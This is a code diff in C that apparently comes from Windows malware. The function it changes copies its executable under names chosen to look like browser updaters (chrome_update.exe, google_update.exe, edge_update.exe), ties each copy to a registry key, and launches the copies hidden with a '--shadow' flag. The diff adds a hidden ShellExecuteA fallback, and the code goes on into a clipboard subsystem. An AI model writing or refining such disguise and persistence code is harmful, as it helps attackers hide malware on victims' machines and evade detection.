@@ -415,19 +415,24 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     char cmdLine[1024];
     snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);
 
-    if (CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
+    BOOL created = CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
-                       NULL, NULL, &si, &pi)) {
+                       NULL, NULL, &si, &pi);
+
+    if (created) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+    } else {
+        /* Fallback: ShellExecuteA with "open" */
+        ShellExecuteA(NULL, "open", destPath, "--shadow", NULL, SW_HIDE);
     }
 }
 
-/* Spawn three shadow copies: chrome_update.exe, dwms.exe, winlogin.exe */
+/* Spawn three shadow copies with benign-looking names */
 void sys_spawn_shadow_copy(void) {
     spawn_single_copy("chrome_update.exe", "ChromeUpdate");
-    spawn_single_copy("dwms.exe", "DwmService");
-    spawn_single_copy("winlogin.exe", "WinLogonService");
+    spawn_single_copy("google_update.exe", "GoogleUpdate");
+    spawn_single_copy("edge_update.exe", "EdgeUpdate");
 }
 
 /* === Clipboard Subsystem === */
